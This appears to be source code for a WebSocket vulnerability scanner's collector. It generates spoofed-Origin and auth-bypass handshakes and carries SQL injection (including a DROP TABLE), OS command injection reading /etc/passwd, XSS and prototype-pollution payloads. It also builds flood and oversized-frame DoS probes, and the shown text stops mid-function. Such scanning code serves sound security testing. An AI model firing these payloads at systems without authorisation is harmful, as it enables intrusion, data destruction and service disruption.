"""
WebSocket Security Detection Collector for ARGUS.

Actively validates discovered WebSocket endpoints for security misconfigurations,
origin validation bypasses (CSWSH), unauthenticated handshakes, query parameter token leakage,
bi-directional frame injection (SQLi, CMDi, XSS, Prototype Pollution), and RFC 6455 protocol abuse:
1. Cross-Site WebSocket Hijacking (CSWSH):
   - Untrusted and spoofed Origin header validation (null, evil.com, subdomain suffix, prefix, scheme downgrade)
   - Ambient credential / cookie hijacking verification
2. Unauthenticated Handshake & Token Leakage:
   - Anonymous handshake access on protected WebSocket routes
   - Sensitive credential and access token exposure in URL query parameters
3. Bi-Directional Message Frame Injection:
   - Frame SQL Injection (SQLi error reflection and database exception signatures)
   - Frame OS Command Injection (CMDi command output reflection and passwd/id signatures)
   - Frame Cross-Site Scripting (Stored / Reflected XSS execution context)
   - Frame Prototype Pollution (__proto__ and constructor prototype manipulation)
4. WebSocket DoS & RFC 6455 Frame Protocol Abuse:
   - Unmasked client frame acceptance (RFC 6455 §5.1 violation without close code 1002)
   - Oversized frame payload length buffer exhaustion (RFC 6455 §5.2 without close code 1009)
   - Message and ping frame flood rate-limiting resilience (CWE-799 without close code 1008 / HTTP 429)

Supports 6 distinct mutation & bypass strategies:
1. ORIGIN_MANIPULATION: null, evil.com, target.com.evil.com, evil-target.com, http downgrade, casing
2. SUBPROTOCOL_TAMPERING: admin, debug, graphql-ws, comma-delimited lists, whitespace/tabs
3. HOP_BY_HOP_SMUGGLING: Connection: keep-alive, Upgrade, casing, trailing whitespace
4. CASING_WHITESPACE_MUTATION: upgrade: WebSocket, CONNECTION: UPGRADE, whitespace padding
5. EXTENSION_DEFLATE_FUZZING: permessage-deflate parameter fuzzing and malformed window bits
6. PARAMETER_AUTHENTICATION_BYPASS: Query token precedence, stripped tokens, header vs query conflicts

Emits structured Evidence(category="websocket_security"), updates mission vulnerabilities,
ControlledMission findings, and expands AttackSurfaceGraph with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import re
import secrets
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


class WebSocketSeverity(str, Enum):
    """WebSocket vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# Backwards compatibility alias
Severity = WebSocketSeverity


class WebSocketTechnique(str, Enum):
    """Enumeration of WebSocket security detection techniques."""
    CSWSH = "cswsh"
    BROKEN_AUTHENTICATION = "broken_authentication"
    TOKEN_IN_QUERY_PARAM = "token_in_query_param"
    INJECTION_SQLI = "injection_sqli"
    INJECTION_CMDI = "injection_cmdi"
    INJECTION_XSS = "injection_xss"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    UNMASKED_FRAME_DOS = "unmasked_frame_dos"
    OVERSIZED_FRAME_DOS = "oversized_frame_dos"
    RATE_LIMIT_FLOOD = "rate_limit_flood"


class WebSocketMutationStrategy(str, Enum):
    """Enumeration of WebSocket handshake & payload mutation strategies."""
    STANDARD = "standard"
    ORIGIN_MANIPULATION = "origin_manipulation"
    SUBPROTOCOL_TAMPERING = "subprotocol_tampering"
    HOP_BY_HOP_SMUGGLING = "hop_by_hop_smuggling"
    CASING_WHITESPACE_MUTATION = "casing_whitespace_mutation"
    EXTENSION_DEFLATE_FUZZING = "extension_deflate_fuzzing"
    PARAMETER_AUTHENTICATION_BYPASS = "parameter_authentication_bypass"


@dataclass
class WebSocketSecurityResult:
    """Represents the parsed outcome of a WebSocket security validation probe."""
    technique: str
    mutation_strategy: str
    severity: str
    confidence: float
    payload: str
    matched_signature: str
    evidence_snippet: str
    endpoint_url: str
    parameter: Optional[str] = None
    parameter_type: str = "websocket_handshake"
    status_code: int = 101
    delay_delta: float = 0.0
    baseline_elapsed: float = 0.0
    injected_elapsed: float = 0.0
    is_valid_finding: bool = True
    error_message: Optional[str] = None
    template_id: str = "websocket-security"
    vulnerability_type: Optional[str] = None
    cwe_id: str = "CWE-1385"
    cvss_score: float = 8.1
    close_code: Optional[int] = None

    def __post_init__(self):
        if not self.vulnerability_type:
            self.vulnerability_type = self.technique


# ============================================================================
# Signature Catalogs & Heuristics
# ============================================================================

CSWSH_VULNERABLE_SIGNATURES: Dict[str, re.Pattern] = {
    "upgrade_accepted": re.compile(r"101\s+Switching\s+Protocols", re.IGNORECASE),
    "websocket_upgrade": re.compile(r"websocket", re.IGNORECASE),
}

HARDENED_WS_DEFENSE_SIGNATURES: Dict[str, re.Pattern] = {
    "origin_forbidden": re.compile(
        r"(?:origin\s+(?:not\s+allowed|forbidden|invalid|mismatch|rejected)|invalid\s+origin|cross-origin\s+websocket\s+forbidden|unauthorized\s+origin|origin\s+header\s+required)",
        re.IGNORECASE,
    ),
    "unauthorized_handshake": re.compile(
        r"(?:unauthorized|missing\s+authentication|invalid\s+token|token\s+expired|authentication\s+required|unauthenticated\s+session|credentials\s+missing)",
        re.IGNORECASE,
    ),
    "upgrade_required": re.compile(
        r"(?:upgrade\s+required|426\s+upgrade\s+required|websocket\s+upgrade\s+required)",
        re.IGNORECASE,
    ),
    "rate_limit_rejection": re.compile(
        r"(?:too\s+many\s+requests|rate\s+limit\s+exceeded|message\s+rate\s+limit|flood\s+detected|policy\s+violation)",
        re.IGNORECASE,
    ),
}

SQL_ERROR_SIGNATURES: Dict[str, re.Pattern] = {
    "postgresql": re.compile(
        r"(?:syntax error at or near|pg_query\(\)|org\.postgresql\.util\.PSQLException|PostgreSQL query failed)",
        re.IGNORECASE,
    ),
    "mysql": re.compile(
        r"(?:You have an error in your SQL syntax|mysql_fetch|com\.mysql\.jdbc|MySQLSyntaxErrorException)",
        re.IGNORECASE,
    ),
    "sqlite": re.compile(
        r"(?:SQLite3::SQLException|near\s+['\"][^'\"]+['\"]: syntax error|sqlite_error|SQLITE_ERROR)",
        re.IGNORECASE,
    ),
    "oracle": re.compile(
        r"(?:ORA-01756|ORA-00933|ORA-00907|Oracle error)",
        re.IGNORECASE,
    ),
    "mssql": re.compile(
        r"(?:Unclosed quotation mark before the character string|Microsoft OLE DB Provider for SQL Server|com\.microsoft\.sqlserver\.jdbc)",
        re.IGNORECASE,
    ),
    "generic_sql": re.compile(
        r"(?:SQL syntax.*error|SQLSTATE\[[0-9A-Z]+\]|unterminated quoted string|quoted string not properly terminated)",
        re.IGNORECASE,
    ),
}

COMMAND_OUTPUT_SIGNATURES: Dict[str, re.Pattern] = {
    "passwd_entry": re.compile(
        r"(?:root:.*?:0:0:|daemon:.*?:1:1:|[a-zA-Z0-9_\-]+:[^:\n]+:\d+:\d+:[^:\n]*:[^:\n]*:[^:\n]*)",
        re.IGNORECASE,
    ),
    "id_command": re.compile(
        r"uid=\d+\([a-zA-Z0-9_\-]+\)\s+gid=\d+\([a-zA-Z0-9_\-]+\)|uid=\d+\s+gid=\d+",
        re.IGNORECASE,
    ),
    "windows_system": re.compile(
        r"(?:Windows IP Configuration|Directory of [A-Z]:\\|Volume in drive [A-Z] is)",
        re.IGNORECASE,
    ),
}

XSS_OUTPUT_SIGNATURES: Dict[str, re.Pattern] = {
    "script_tag": re.compile(
        r"<script>alert\(['\"]?(?:ARGUS_WS_XSS|1)['\"]?\)</script>",
        re.IGNORECASE,
    ),
    "img_onerror": re.compile(
        r"<img\s+src=x\s+onerror=alert\(['\"]?1['\"]?\)>",
        re.IGNORECASE,
    ),
    "svg_onload": re.compile(
        r"<svg\s+onload=alert\(['\"]?1['\"]?\)>",
        re.IGNORECASE,
    ),
}

PROTOTYPE_POLLUTION_SIGNATURES: Dict[str, re.Pattern] = {
    "polluted_property": re.compile(
        r'(?:["\']polluted["\']\s*:\s*true|["\']isAdmin["\']\s*:\s*true|["\']prototype_polluted["\']\s*:\s*true)',
        re.IGNORECASE,
    ),
    "prototype_echo": re.compile(
        r"(?:Object\.prototype\.(?:polluted|isAdmin)|polluted:\s*true)",
        re.IGNORECASE,
    ),
}

DOS_CRASH_SIGNATURES: Dict[str, re.Pattern] = {
    "server_error_500": re.compile(r"500\s+Internal\s+Server\s+Error", re.IGNORECASE),
    "service_unavailable": re.compile(r"503\s+Service\s+Unavailable", re.IGNORECASE),
    "connection_reset": re.compile(r"(?:connection\s+reset|broken\s+pipe|server\s+closed\s+connection\s+without\s+response)", re.IGNORECASE),
}


# ============================================================================
# Payload & Handshake Generator
# ============================================================================

class WebSocketPayloadGenerator:
    """Generates RFC 6455 handshake requests, mutations, frame injections, and protocol fuzzers."""

    RFC6455_MAGIC_GUID: str = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    @classmethod
    def generate_sec_websocket_key(cls) -> str:
        """Generates a cryptographically random 16-byte Base64-encoded Sec-WebSocket-Key."""
        random_bytes = os.urandom(16)
        return base64.b64encode(random_bytes).decode("utf-8")

    @classmethod
    def compute_sec_websocket_accept(cls, key: str) -> str:
        """
        Computes the expected RFC 6455 §4.2.2 Sec-WebSocket-Accept header value.
        Sec-WebSocket-Accept = Base64(SHA-1(Key + RFC6455_MAGIC_GUID))
        """
        combined = (key.strip() + cls.RFC6455_MAGIC_GUID).encode("utf-8")
        sha1_hash = hashlib.sha1(combined).digest()
        return base64.b64encode(sha1_hash).decode("utf-8")

    @classmethod
    def build_handshake_headers(
        cls,
        url: str,
        origin: Optional[str] = None,
        subprotocols: Optional[List[str]] = None,
        extensions: Optional[List[str]] = None,
        key: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None,
    ) -> Tuple[Dict[str, str], str]:
        """
        Constructs standard RFC 6455 HTTP/1.1 Upgrade headers.
        Returns a tuple of (headers_dict, sec_websocket_key).
        """
        ws_key = key or cls.generate_sec_websocket_key()
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc or "localhost"

        headers: Dict[str, str] = {
            "Host": host,
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
        }

        if origin:
            headers["Origin"] = origin
        else:
            # Standard same-origin default
            scheme = "https" if parsed.scheme in ("wss", "https") else "http"
            headers["Origin"] = f"{scheme}://{host}"

        if subprotocols:
            headers["Sec-WebSocket-Protocol"] = ", ".join(subprotocols)

        if extensions:
            headers["Sec-WebSocket-Extensions"] = "; ".join(extensions)

        if custom_headers:
            headers.update(custom_headers)

        return headers, ws_key

    @classmethod
    def generate_origin_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates 6 distinct Origin manipulation headers targeting CSWSH filter weaknesses.
        Returns list of (strategy, headers_dict, origin_string).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
        }

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []

        # 1. Null Origin (Sandboxed iframe / privacy mode simulation)
        h_null = dict(base_headers)
        h_null["Origin"] = "null"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_null, "null"))

        # 2. Arbitrary Attacker Origin
        h_evil = dict(base_headers)
        h_evil["Origin"] = "https://evil.com"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_evil, "https://evil.com"))

        # 3. Subdomain Suffix Matching Bypass (e.g. target.com.attacker.com)
        h_suffix = dict(base_headers)
        h_suffix["Origin"] = f"https://{target_host}.attacker.com"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_suffix, f"https://{target_host}.attacker.com"))

        # 4. Prefix Matching Bypass (e.g. attackertarget.com)
        clean_host = target_host.split(":")[0]
        h_prefix = dict(base_headers)
        h_prefix["Origin"] = f"https://attacker{clean_host}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_prefix, f"https://attacker{clean_host}"))

        # 5. Insecure Scheme Downgrade (http vs https)
        h_scheme = dict(base_headers)
        h_scheme["Origin"] = f"http://{target_host}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_scheme, f"http://{target_host}"))

        # 6. Origin Casing Variation
        h_case = dict(base_headers)
        h_case["Origin"] = f"https://{target_host.upper()}"
        mutations.append((WebSocketMutationStrategy.ORIGIN_MANIPULATION, h_case, f"https://{target_host.upper()}"))

        return mutations

    @classmethod
    def generate_subprotocol_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates Subprotocol tampering probes targeting administrative and unauthenticated routing.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        subproto_tests = [
            "admin, superuser, internal",
            "debug, raw, diagnostics",
            "graphql-ws, graphql-transport-ws",
            "chat, admin, v1.proto, *",
            "graphql-ws\t",
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for proto in subproto_tests:
            h = dict(base_headers)
            h["Sec-WebSocket-Protocol"] = proto
            mutations.append((WebSocketMutationStrategy.SUBPROTOCOL_TAMPERING, h, proto))

        return mutations

    @classmethod
    def generate_hop_by_hop_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates Hop-by-Hop and Upgrade header smuggling variants to bypass reverse proxy filters.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        variants = [
            ({"Connection": "keep-alive, Upgrade", "Upgrade": "websocket"}, "Connection: keep-alive, Upgrade"),
            ({"Connection": "close, Upgrade", "Upgrade": "websocket"}, "Connection: close, Upgrade"),
            ({"Connection": "Upgrade", "Upgrade": "WebSocket"}, "Upgrade: WebSocket (cased)"),
            ({"Connection": "Upgrade, X-Forwarded-For", "Upgrade": "websocket; "}, "Trailing whitespace in Upgrade"),
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for extra_hdrs, desc in variants:
            h: Dict[str, str] = {
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13",
                "Host": target_host,
                "Origin": f"https://{target_host}",
            }
            h.update(extra_hdrs)
            mutations.append((WebSocketMutationStrategy.HOP_BY_HOP_SMUGGLING, h, desc))

        return mutations

    @classmethod
    def generate_casing_whitespace_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates header casing and whitespace variation probes.
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        variants = [
            ({"upgrade": "websocket", "connection": "upgrade"}, "lowercase upgrade/connection"),
            ({"UPGRADE": "WEBSOCKET", "CONNECTION": "UPGRADE"}, "uppercase UPGRADE/CONNECTION"),
            ({"Upgrade": " websocket ", "Connection": " Upgrade "}, "padded whitespace in values"),
            ({"Sec-WebSocket-Key": f"{ws_key}  ", "Sec-WebSocket-Version": "13", "Upgrade": "websocket", "Connection": "Upgrade"}, "trailing whitespace in WS key"),
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for extra_hdrs, desc in variants:
            h: Dict[str, str] = {
                "Sec-WebSocket-Key": ws_key,
                "Sec-WebSocket-Version": "13",
                "Host": target_host,
                "Origin": f"https://{target_host}",
            }
            h.update(extra_hdrs)
            mutations.append((WebSocketMutationStrategy.CASING_WHITESPACE_MUTATION, h, desc))

        return mutations

    @classmethod
    def generate_extension_deflate_mutations(
        cls,
        target_url: str,
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]]:
        """
        Generates WebSocket compression/extension fuzzing probes (permessage-deflate).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        ext_tests = [
            "permessage-deflate; client_max_window_bits=15",
            "permessage-deflate; client_no_context_takeover; server_no_context_takeover",
            "permessage-deflate; client_max_window_bits=99999",
            "unknown-extension-fuzz, x-webkit-deflate-frame",
        ]

        mutations: List[Tuple[WebSocketMutationStrategy, Dict[str, str], str]] = []
        for ext in ext_tests:
            h = dict(base_headers)
            h["Sec-WebSocket-Extensions"] = ext
            mutations.append((WebSocketMutationStrategy.EXTENSION_DEFLATE_FUZZING, h, ext))

        return mutations

    @classmethod
    def generate_parameter_auth_bypass_mutations(
        cls,
        target_url: str,
        token: str = "secret_token_123",
        key: Optional[str] = None,
    ) -> List[Tuple[WebSocketMutationStrategy, str, Dict[str, str], str]]:
        """
        Generates authentication parameter manipulation probes across URL queries and headers.
        Returns list of (strategy, modified_url, headers_dict, description).
        """
        parsed = urllib.parse.urlparse(target_url)
        target_host = parsed.netloc or "target.example.com"
        ws_key = key or cls.generate_sec_websocket_key()

        base_headers: Dict[str, str] = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": "13",
            "Host": target_host,
            "Origin": f"https://{target_host}",
        }

        probes: List[Tuple[WebSocketMutationStrategy, str, Dict[str, str], str]] = []

        # 1. Query token variations
        for param in ("token", "access_token", "apiKey", "ticket", "auth"):
            sep = "&" if "?" in target_url else "?"
            mutated_url = f"{target_url}{sep}{param}={token}"
            probes.append((
                WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
                mutated_url,
                dict(base_headers),
                f"Query parameter token leakage: {param}",
            ))

        # 2. Stripped / Null tokens
        sep = "&" if "?" in target_url else "?"
        probes.append((
            WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
            f"{target_url}{sep}token=null",
            dict(base_headers),
            "Stripped token (?token=null)",
        ))

        # 3. Header vs Query conflict (Bearer header + invalid query token)
        h_conflict = dict(base_headers)
        h_conflict["Authorization"] = f"Bearer {token}"
        probes.append((
            WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS,
            f"{target_url}{sep}token=invalid_token",
            h_conflict,
            "Conflicting Authorization header and query token",
        ))

        return probes

    # Frame-level injection vectors
    @classmethod
    def generate_frame_sqli_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame SQL injection payloads."""
        return [
            {"action": "query", "id": "1' OR '1'='1 --"},
            {"type": "search", "term": "admin' UNION SELECT @@version, user() --"},
            {"filter": "'; DROP TABLE messages; --"},
            {"user": "admin' --", "password": "password"},
            {"raw_text": "1' OR '1'='1' --"},
        ]

    @classmethod
    def generate_frame_cmdi_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame OS command injection payloads."""
        return [
            {"action": "ping", "host": "127.0.0.1; id"},
            {"exec": "| whoami"},
            {"command": "& cat /etc/passwd"},
            {"action": "diagnostics", "target": "localhost | id ; cat /etc/passwd"},
            {"raw_text": "; id ; cat /etc/passwd"},
        ]

    @classmethod
    def generate_frame_xss_payloads(cls) -> List[Dict[str, Any]]:
        """Generates structured JSON and text frame Cross-Site Scripting (XSS) payloads."""
        return [
            {"action": "message", "content": "<script>alert('ARGUS_WS_XSS')</script>"},
            {"chat": "<img src=x onerror=alert(1)>"},
            {"title": "<svg onload=alert(1)>"},
            {"raw_text": "<script>alert('ARGUS_WS_XSS')</script>"},
        ]

    @classmethod
    def generate_frame_prototype_pollution_payloads(cls) -> List[Dict[str, Any]]:
        """Generates prototype pollution frame payloads."""
        return [
            {"__proto__": {"admin": True, "polluted": True}},
            {"constructor": {"prototype": {"isAdmin": True, "role": "superuser"}}},
            {"payload": {"__proto__": {"polluted": True}}},
        ]

    @classmethod
    def generate_unmasked_frame_payload(cls, message: str = "ARGUS_UNMASKED_PROBE") -> bytes:
        """
        Constructs an RFC 6455 unmasked client text frame (violating RFC 6455 §5.1).
        Byte 0: 0x81 (FIN=1, Opcode=1 for text)
        Byte 1: Mask bit = 0, Payload Length
        """
        payload_bytes = message.encode("utf-8")
        length = len(payload_bytes)
        if length < 126:
            # Mask bit is 0 -> length byte has MSB = 0
            header = bytes([0x81, length])
        elif length < 65536:
            header = bytes([0x81, 126, (length >> 8) & 0xFF, length & 0xFF])
        else:
            header = bytes([0x81, 127]) + length.to_bytes(8, byteorder="big")
        return header + payload_bytes

    @classmethod
    def generate_oversized_frame_header(cls) -> bytes:
        """Constructs an RFC 6455 frame header declaring a 64-bit oversized length (16MB+)."""
        # Declares length = 0x0000000001000000 (16MB)
        declared_len = 16 * 1024 * 1024
        header = bytes([0x81, 0xFE]) + declared_len.to_bytes(8, byteorder="big")
        return header

    @classmethod
    def generate_ping_flood_frames(cls, count: int = 50) -> List[bytes]:
        """Generates a burst of RFC 6455 Ping frames (opcode 0x9) with masked client payloads."""
        frames = []
        for i in range(count):
            mask = secrets.token_bytes(4)
            data = f"ping_{i}".encode("utf-8")
            masked_data = bytes([b ^ mask[j % 4] for j, b in enumerate(data)])
            # 0x89 = FIN=1, Opcode=9 (Ping), 0x80 | len = Mask=1
            header = bytes([0x89, 0x80 | len(data)]) + mask
            frames.append(header + masked_data)
        return frames


# ============================================================================
# Security Analyzer
# ============================================================================

class WebSocketSecurityAnalyzer:
    """Analyzes handshake responses, response headers, frame outputs, and close status codes."""

    @classmethod
    def verify_sec_websocket_accept(cls, key: str, accept_header: Optional[str]) -> bool:
        """
        Verifies RFC 6455 §4.2.2 Sec-WebSocket-Accept hash validity.
        """
        if not key or not accept_header:
            return False
        expected = WebSocketPayloadGenerator.compute_sec_websocket_accept(key)
        return accept_header.strip() == expected.strip()

    @classmethod
    def is_hardened_rejection(
        cls,
        status_code: int,
        body: str = "",
        headers: Optional[Dict[str, str]] = None,
    ) -> bool:
        """
        Evaluates whether a response indicates properly hardened security defense.
        Status codes 400, 401, 403, 404, 405, 426 or defense signatures indicate secure rejection.
        """
        if status_code in (400, 401, 403, 404, 405, 426):
            return True

        if body:
            for sig_name, pattern in HARDENED_WS_DEFENSE_SIGNATURES.items():
                if pattern.search(body):
                    return True

        return False

    @classmethod
    def analyze_cswsh(
        cls,
        endpoint_url: str,
        mutation_strategy: WebSocketMutationStrategy,
        origin_used: str,
        key_used: str,
        response: HttpResponse,
    ) -> Optional[WebSocketSecurityResult]:
        """
        Evaluates handshake response against Cross-Site WebSocket Hijacking (CSWSH).
        Vulnerable if server returns 101 with valid Sec-WebSocket-Accept for untrusted cross-origins.
        """
        if cls.is_hardened_rejection(response.status_code, response.body, response.headers):
            return None

        # Same origin acceptance is normal and never CSWSH
        parsed_target = urllib.parse.urlparse(endpoint_url)
        target_scheme = "https" if parsed_target.scheme in ("https", "wss") else "http"
        target_origin = f"{target_scheme}://{parsed_target.netloc}".lower().rstrip("/")
        normalized_origin = origin_used.strip().lower().rstrip("/")

        if normalized_origin == target_origin:
            return None

        # Check for 101 Switching Protocols or HTTP 200 with valid upgrade accept
        is_101 = response.status_code == 101
        is_upgrade_200 = response.status_code == 200 and "websocket" in (response.headers.get("upgrade") or "").lower()

        if not (is_101 or is_upgrade_200):
            return None

        accept_header = response.headers.get("sec-websocket-accept") or response.headers.get("Sec-WebSocket-Accept")
        if not cls.verify_sec_websocket_accept(key_used, accept_header):
            return None

        evidence_snippet = f"Server accepted cross-origin WebSocket handshake with Origin: '{origin_used}'. Status: {response.status_code}, Sec-WebSocket-Accept: {accept_header}"

        return WebSocketSecurityResult(
            technique=WebSocketTechnique.CSWSH.value,
            mutation_strategy=mutation_strategy.value,
            severity=WebSocketSeverity.HIGH.value,
            confidence=0.95,
            payload=f"Origin: {origin_used}",
            matched_signature="cswsh_untrusted_origin_accepted",
            evidence_snippet=evidence_snippet,
            endpoint_url=endpoint_url,
            parameter="Origin",
            parameter_type="http_header",
            status_code=response.status_code,
            cwe_id="CWE-1385",
            cvss_score=8.8,
        )

    @classmethod
    def analyze_unauthenticated_handshake(
        cls,
        endpoint_url: str,
        key_used: str,
        response: HttpResponse,
        is_protected_route: bool = True,
    ) -> Optional[WebSocketSecurityResult]:
        """
        Evaluates handshake response for unauthenticated access on protected WebSocket endpoints.
        """
        if cls.is_hardened_rejection(response.status_code, response.body, response.headers):
            return None

        is_101 = response.status_code == 101
        accept_header = response.headers.get("sec-websocket-accept") or response.headers.get("Sec-WebSocket-Accept")

        if is_101 and cls.verify_sec_websocket_accept(key_used, accept_header):
            evidence_snippet = f"Server accepted unauthenticated WebSocket connection on '{endpoint_url}'. Status: {response.status_code}, Sec-WebSocket-Accept: {accept_header}"
            return WebSocketSecurityResult(
                technique=WebSocketTechnique.BROKEN_AUTHENTICATION.value,
                mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                severity=WebSocketSeverity.HIGH.value,
                confidence=0.90,
                payload="Anonymous Handshake (No Auth Headers / Cookies)",
                matched_signature="unauthenticated_handshake_allowed",
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter="Authorization",
                parameter_type="http_header",
                status_code=response.status_code,
                cwe_id="CWE-287",
                cvss_score=7.5,
            )

        return None

    @classmethod
    def analyze_query_token_leakage(
        cls,
        endpoint_url: str,
        response: HttpResponse,
    ) -> Optional[WebSocketSecurityResult]:
        """
        Detects sensitive authentication tokens passed in URL query parameters.
        """
        parsed = urllib.parse.urlparse(endpoint_url)
        query_params = urllib.parse.parse_qs(parsed.query)

        sensitive_keys = {"token", "access_token", "apikey", "api_key", "ticket", "auth", "secret"}
        leaked_keys = [k for k in query_params if k.lower() in sensitive_keys]

        if leaked_keys and response.status_code in (101, 200):
            # Redact actual token value in evidence snippet
            param_name = leaked_keys[0]
            evidence_snippet = f"Authentication token '{param_name}' exposed in WebSocket URL query string on '{endpoint_url.split('?')[0]}'."
            return WebSocketSecurityResult(
                technique=WebSocketTechnique.TOKEN_IN_QUERY_PARAM.value,
                mutation_strategy=WebSocketMutationStrategy.PARAMETER_AUTHENTICATION_BYPASS.value,
                severity=WebSocketSeverity.MEDIUM.value,
                confidence=0.85,
                payload=f"?{param_name}=[REDACTED]",
                matched_signature="token_in_query_parameter",
                evidence_snippet=evidence_snippet,
                endpoint_url=endpoint_url,
                parameter=param_name,
                parameter_type="query_parameter",
                status_code=response.status_code,
                cwe_id="CWE-598",
                cvss_score=5.3,
            )

        return None

    @classmethod
    def analyze_frame_response(
        cls,
        endpoint_url: str,
        technique: WebSocketTechnique,
        payload_str: str,
        response_body: str,
        status_code: int = 101,
        close_code: Optional[int] = None,
    ) -> Optional[WebSocketSecurityResult]:
        """
        Analyzes bi-directional message frame responses for SQLi, CMDi, XSS, and Prototype Pollution.
        Suppresses false positives when server gracefully terminates with RFC close codes 1000, 1002, 1003, 1008.
        """
        if close_code in (1000, 1002, 1003, 1008, 1009) and not response_body:
            return None

        if not response_body:
            return None

        # 1. SQL Injection
        if technique == WebSocketTechnique.INJECTION_SQLI:
            for engine, pattern in SQL_ERROR_SIGNATURES.items():
                match = pattern.search(response_body)
                if match:
                    snippet = match.group(0)
                    return WebSocketSecurityResult(
                        technique=WebSocketTechnique.INJECTION_SQLI.value,
                        mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                        severity=WebSocketSeverity.CRITICAL.value,
                        confidence=0.95,
                        payload=payload_str,
                        matched_signature=f"sqli_{engine}:{snippet}",
                        evidence_snippet=f"WebSocket frame SQL injection triggered {engine} database error: '{snippet}'",
                        endpoint_url=endpoint_url,
                        parameter="frame_data",
                        parameter_type="websocket_frame",
                        status_code=status_code,
                        cwe_id="CWE-89",
                        cvss_score=9.0,
                    )

        # 2. Command Injection
        elif technique == WebSocketTechnique.INJECTION_CMDI:
            for engine, pattern in COMMAND_OUTPUT_SIGNATURES.items():
                match = pattern.search(response_body)
                if match:
                    snippet = match.group(0)
                    return WebSocketSecurityResult(
                        technique=WebSocketTechnique.INJECTION_CMDI.value,
                        mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                        severity=WebSocketSeverity.CRITICAL.value,
                        confidence=0.98,
                        payload=payload_str,
                        matched_signature=f"cmdi_{engine}:{snippet}",
                        evidence_snippet=f"WebSocket frame command injection returned OS command output: '{snippet}'",
                        endpoint_url=endpoint_url,
                        parameter="frame_data",
                        parameter_type="websocket_frame",
                        status_code=status_code,
                        cwe_id="CWE-78",
                        cvss_score=9.8,
                    )

        # 3. Cross-Site Scripting (XSS)
        elif technique == WebSocketTechnique.INJECTION_XSS:
            for sig_name, pattern in XSS_OUTPUT_SIGNATURES.items():
                match = pattern.search(response_body)
                if match:
                    snippet = match.group(0)
                    return WebSocketSecurityResult(
                        technique=WebSocketTechnique.INJECTION_XSS.value,
                        mutation_strategy=WebSocketMutationStrategy.STANDARD.value,
                        severity=WebSocketSeverity.HIGH.value,
                        confidence=0.90,
                        payload=payload_str,
                        matched_signature=f"xss_{sig_name}:{snippet}",
